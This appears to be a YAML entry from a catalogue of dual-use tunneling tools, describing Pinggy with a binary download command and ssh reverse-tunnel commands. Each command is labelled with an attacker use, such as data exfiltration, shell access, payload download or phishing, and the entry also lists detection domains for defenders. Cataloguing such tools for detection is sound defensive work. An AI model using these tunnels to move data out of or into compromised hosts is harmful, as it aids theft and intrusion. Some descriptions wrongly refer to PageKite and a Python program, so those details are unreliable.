---
Name: Pinggy
Description: Pinggy is a fast, versatile, and privacy-focused tunneling solution that enables users to expose local services, files, and ports over the internet. It can be leveraged for legitimate purposes like development, testing, and IoT access, but it may also be misused by threat actors to expose sensitive systems, services, or files for malicious purposes. This can be used with SSh or directly via the provided binary.
Author: Kamran Saifullah
Created: 2024-10-14
Commands:

  - Command: wget https://s3.ap-south-1.amazonaws.com/public.pinggy.binaries/v0.1.3/mac/univ/pinggy
    Description: PageKite provides binarues for multiple operating systems that are not required to be installed on the system as these are standalone binaries.
    Usecase: Downloading and execution of pagekite python program.
    Category: Install
    Privileges: User
    OperatingSystem: Windows, Mac, Linux

  - Command: ssh -p <PORT> -R0:localhost:8000 -L4300:localhost:4300 a.pinggy.io
    Description: Having a local web server running on the local machine, it is possible to expose the entire file system via pinggy tunnels. 
    Usecase: Exposing local file system over the internet for data exfiltrations. 
    Category: exfiltrate
    Privileges: User
    OperatingSystem: Windows, Mac, Linux

  - Command: ssh -p <SSH/RDP/ PORT> -R0:localhost:8000 -L4300:localhost:4300 a.pinggy.io
    Description: Exposing local shell services running on the local machine over the internet for shell access.
    Usecase: Hosting local services and binding them to pinggy tunnels for shell-access
    Category: shell-access
    Privileges: User
    OperatingSystem: Windows, Mac, Linux

  - Command: ssh -p <PORT> -R0:localhost:8000 -L4300:localhost:4300 a.pinggy.io
    Description: Exposing local serivces/applications running locally and binding them to pinggy domains to be accessed over the internet.
    Usecase: Hosting local services/applications running locally and exposing them over the internet.
    Category: access
    Privileges: User
    OperatingSystem: Windows, Mac, Linux

  - Command: ssh -p <PORT> -R0:localhost:8000 -L4300:localhost:4300 a.pinggy.io
    Description: Having local files in the directory and exposing them via hosting local web server and binding it to pinggy tunnels will enable threat actors to download malicious binaies onto the compromised host. 
    Usecase: Hosting malicious binaries locally and downloading these over to the compromised host.
    Category: download
    Privileges: User
    OperatingSystem: Windows, Mac, Linux

  - Command: ssh -p <PORT>> -R0:localhost:8000 -L4300:localhost:4300 a.pinggy.io
    Description: Hosting phishing website locally and exposing it over pinggy tunnels to compromise users.
    Usecase: Threat actors can host phishing sites running on the local server and can expose these over the pinggy tunnels for targeting users. 
    Category: phishing
    Privileges: User
    OperatingSystem: Windows, Mac, Linux

Full_Path:
  - Path: Downloaded version of pinggy, or directly via SSH.
Detection:
  - Domain: '*.pinggy.io'
  - Domain: '*.pinggy.link'
  - Domain: '*.*.amazonaws.com/public.pinggy.binaries/*'
Resources:
  - Link: https://pinggy.io/docs/
Acknowledgement:
  - Person: Kamran Saifullah
    Handle: '@deFr0ggy'
---
